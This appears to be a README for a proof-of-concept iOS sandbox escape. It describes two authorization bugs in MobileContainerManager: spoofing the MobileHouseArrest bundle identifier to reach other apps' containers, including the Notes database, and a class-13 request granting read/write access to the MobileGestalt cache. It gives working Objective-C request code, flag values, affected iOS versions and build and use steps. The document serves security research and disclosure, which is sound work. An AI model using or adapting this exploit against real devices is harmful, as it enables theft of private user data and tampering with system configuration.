# MobileHouseArrest container access PoC

## Overview

MobileContainerManager trusted the caller's CodeDirectory identifier as an
authorization key. A development-signed app could use this identifier:

```text
com.apple.mobile.MobileHouseArrest
```

The app could then request another app's data container or app-group
container. The returned sandbox extension gave read and write access while it
was active.

The same PoC also implements the separate class-13 MobileGestalt authorization
bug. That route does not depend on the MobileHouseArrest identity.

## Paths accessed

| Request | Path |
| --- | --- |
| Class 2 and an app identifier | `/private/var/mobile/Containers/Data/Application/<UUID>/` |
| Class 7 and an app-group identifier | `/private/var/mobile/Containers/Shared/AppGroup/<UUID>/` |
| Class 13 and `systemgroup.com.apple.mobilegestaltcache` | `/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/` |

One notable target is the Notes app group, `group.com.apple.notes`. Its
container includes the user's Notes database and sidecar files:

```text
/private/var/mobile/Containers/Shared/AppGroup/<Notes-group-UUID>/NoteStore.sqlite
/private/var/mobile/Containers/Shared/AppGroup/<Notes-group-UUID>/NoteStore.sqlite-wal
/private/var/mobile/Containers/Shared/AppGroup/<Notes-group-UUID>/NoteStore.sqlite-shm
```

The MobileHouseArrest route therefore exposed sensitive user note data through
the same class-7 container access.

The request selects a container identifier. It does not select an arbitrary
filesystem path.

## MobileHouseArrest request

```objc
container_query_t query = query_create();
query_set_class(query, 2);
query_set_flags(query, UINT64_C(0x900000000));
query_set_part(query, 0);

xpc_object_t ids = xpc_array_create(NULL, 0);
xpc_array_set_string(ids, XPC_ARRAY_APPEND,
                     "local.research.SandboxCanaryVictim");
query_set_ids(query, ids);

container_object_t object = query_result(query);
BOOL activated = object != NULL && activate(object, false);
```

After activation, normal file APIs can read and write files inside the selected
container.

## Class-13 MobileGestalt request

A separate class-13 authorization bug gave read and write access to this fixed
directory:

```text
/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/
```

This includes:

```text
/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist
```

That route used class 13, group identifier
`systemgroup.com.apple.mobilegestaltcache`, part 3, and read/write flags.

```objc
container_query_t query = query_create();
query_set_class(query, 13);

xpc_object_t groups = xpc_array_create(NULL, 0);
xpc_array_set_string(groups, XPC_ARRAY_APPEND,
    "systemgroup.com.apple.mobilegestaltcache");
query_set_group_ids(query, groups);

query_set_flags(query, UINT64_C(0x8100000000));
query_set_part(query, 3);
```

`run_mobilegestalt_class13_poc()` requires a nonempty sandbox token, activates
it, opens the live MobileGestalt plist with `O_RDWR`, and confirms access is
revoked after release. It does not change the plist.

On releases without the newer `part` API, the PoC requests the system-group
root and tests the same plist below `Library/Caches`.

## Versions

Works on iOS 27 beta 1 through beta 4 and iOS 26. It should also apply to
iOS 18, although some releases may need implementation adjustments.

## Use

1. Add [`poc.m`](poc.m) to an Objective-C iOS application target.
2. Build with the `iphoneos` SDK for `arm64e`.
3. For cross-container access, set the bundle identifier to
   `com.apple.mobile.MobileHouseArrest` and call
   `run_mobilehousearrest_poc()`.
4. For the fixed MobileGestalt cache route, call
   `run_mobilegestalt_class13_poc()`. This route can use an ordinary app
   identifier.
